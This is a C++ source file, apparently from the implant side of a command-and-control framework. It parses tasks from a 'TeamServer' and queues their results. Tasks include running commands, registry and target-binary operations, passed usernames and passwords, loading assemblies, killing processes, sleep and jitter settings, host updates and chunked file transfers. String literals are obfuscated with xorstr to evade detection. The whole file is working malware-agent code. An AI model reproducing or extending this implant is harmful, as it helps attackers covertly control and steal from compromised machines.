// ========================================== { START OF FILE } ========================================== //
#include "agent/task/task_queue_manager.h"

#include <cstdint>

#include <rapidjson/document.h>
#include <rapidjson/error/en.h>
#include <string>

#include "xorstr/xorstr.hpp"

namespace agent::task {

    namespace {

        /// Looks up a member by primary name, falling back to a legacy key when provided.
        [[nodiscard]] const rapidjson::Value* FindMember(const rapidjson::Value& object, const char* primary,
                                                         const char* fallback = nullptr) {
            if (!object.IsObject()) {
                return nullptr;
            }
            auto member = object.FindMember(primary);
            if (member != object.MemberEnd()) {
                return &member->value;
            }
            if (fallback != nullptr) {
                member = object.FindMember(fallback);
                if (member != object.MemberEnd()) {
                    return &member->value;
                }
            }
            return nullptr;
        }

        void ReadInt(const rapidjson::Value& object, const char* primary, const char* fallback, int& out) {
            const rapidjson::Value* value = FindMember(object, primary, fallback);
            if (value != nullptr && value->IsInt()) {
                out = value->GetInt();
            }
        }

        void ReadString(const rapidjson::Value& object, const char* primary, const char* fallback, std::string& out) {
            const rapidjson::Value* value = FindMember(object, primary, fallback);
            if (value != nullptr && value->IsString()) {
                out = value->GetString();
            }
        }

        /// 64-bit reader. rapidjson parses a number that fits in 32 bits as kNumberType/Int, so an
        /// offset of 0 arrives as `int` — accept every integer form before calling GetInt64().
        void ReadInt64(const rapidjson::Value& object, const char* primary, std::int64_t& out) {
            const rapidjson::Value* value = FindMember(object, primary);
            if (value == nullptr || !value->IsNumber()) {
                return;
            }
            if (value->IsInt64()) {
                out = value->GetInt64();
            } else if (value->IsInt()) {
                out = value->GetInt();
            } else if (value->IsUint()) {
                out = value->GetUint();
            }
        }

        void ReadBool(const rapidjson::Value& object, const char* primary, bool& out) {
            const rapidjson::Value* value = FindMember(object, primary);
            if (value != nullptr && value->IsBool()) {
                out = value->GetBool();
            }
        }

    }  // namespace

    TaskQueueManager::TaskQueueManager() = default;

    bool TaskQueueManager::HasPendingResult() const { return !task_results.empty(); }

    bool TaskQueueManager::HasPendingTask() const { return !task_queue.empty(); }

    void TaskQueueManager::StoreTaskResult(int task_id, bool is_successful, const std::string& output) {
        StoreTaskResult(task_id, 0, 0, is_successful, output);
    }

    void TaskQueueManager::StoreTaskResult(int task_id, int task_type, int task_code, bool is_successful,
                                           const std::string& output) {
        models::ResultRequest result;
        result.task_id = task_id;
        result.task_type = task_type;
        result.task_code = task_code;
        result.is_successful = is_successful;
        result.output = output;
        task_results.push(result);
    }

    std::string TaskQueueManager::GetTaskResult() {
        // The server expects an array of TaskResp<T> objects (an empty array means "no results").
        std::string payload = xorstr_("[");
        bool first = true;
        while (!task_results.empty()) {
            if (!first) {
                payload += xorstr_(",");
            }
            payload += task_results.front().ToJson();
            task_results.pop();
            first = false;
        }
        payload += xorstr_("]");
        return payload;
    }

    void TaskQueueManager::QueueTask(const std::string& blob) { task_queue.push(blob); }

    models::CheckinResponse TaskQueueManager::GetNextTask() {
        const std::string raw = task_queue.front();
        task_queue.pop();

        models::CheckinResponse response;

        rapidjson::Document doc;
        doc.Parse(raw.c_str(), raw.size());
        if (doc.HasParseError() || !doc.IsObject()) {
            return response;
        }

        // The TeamServer serialises Trinity.Shared.DTOs.Task.TaskRequest with default (PascalCase)
        // property names — the wire keys below must not change. Lower-case keys are accepted as a
        // fallback for older payloads.
        ReadInt(doc, xorstr_("TaskID"), "id", response.id);
        ReadInt(doc, xorstr_("TaskType"), "type", response.type);
        ReadInt(doc, xorstr_("TaskCode"), "code", response.code);

        const rapidjson::Value* command = FindMember(doc, xorstr_("Command"), xorstr_("command"));
        if (command == nullptr) {
            // No command payload at all: leave has_command false so the dispatcher reports the
            // shape error against this task instead of dropping it.
            return response;
        }

        response.has_command = true;

        if (command->IsString()) {
            // Legacy layout: the command payload is a bare string.
            response.run_command = command->GetString();
            ReadInt(doc, "PID", nullptr, response.pid);
            return response;
        }

        const rapidjson::Value& payload = *command;

        ReadString(payload, xorstr_("Commandlet"), nullptr, response.command.commandlet);
        ReadString(payload, xorstr_("Arguements"), xorstr_("Arguments"), response.command.arguments);
        ReadString(payload, xorstr_("Command"), nullptr, response.run_command);
        ReadString(payload, xorstr_("RegKey"), nullptr, response.reg_key);
        ReadString(payload, xorstr_("TargetBinary"), nullptr, response.target_binary);
        ReadString(payload, xorstr_("Operation"), nullptr, response.operation);
        ReadString(payload, "Path", nullptr, response.file_path);
        ReadString(payload, xorstr_("TransferID"), nullptr, response.transfer_id);
        ReadString(payload, xorstr_("Username"), nullptr, response.username);
        ReadString(payload, xorstr_("Password"), nullptr, response.password);
        ReadString(payload, xorstr_("TaskName"), nullptr, response.task_name);
        ReadString(payload, xorstr_("Assembly"), nullptr, response.assembly);
        ReadString(payload, xorstr_("Program"), nullptr, response.program);
        // SET/UPDATE_HOSTS sends Command.Hosts as an array of strings.
        if (const rapidjson::Value* hosts = FindMember(payload, xorstr_("Hosts")); hosts != nullptr && hosts->IsArray()) {
            for (const rapidjson::Value& host : hosts->GetArray()) {
                if (host.IsString()) {
                    response.hosts.emplace_back(host.GetString());
                }
            }
        }

        ReadInt(payload, xorstr_("Sleep"), nullptr, response.sleep_ms);
        ReadInt(payload, xorstr_("Jitter"), nullptr, response.jitter);
        ReadInt(payload, "PID", nullptr, response.pid);

        // Chunked download: the server rewrites the command into DownloadChunkPayload
        // (Command.Data = base64 bytes, Offset, TotalBytes, Final).
        ReadString(payload, xorstr_("Data"), nullptr, response.chunk_data);
        ReadInt64(payload, xorstr_("Offset"), response.chunk_offset);
        ReadInt64(payload, xorstr_("TotalBytes"), response.chunk_total_bytes);
        ReadBool(payload, xorstr_("Final"), response.chunk_final);

        // KILL/RUN_U historically carried the PID as a top-level member.
        if (response.pid == 0) {
            ReadInt(doc, "PID", nullptr, response.pid);
        }

        return response;
    }

}  // namespace agent::task
// ========================================== { END OF FILE } ========================================== //
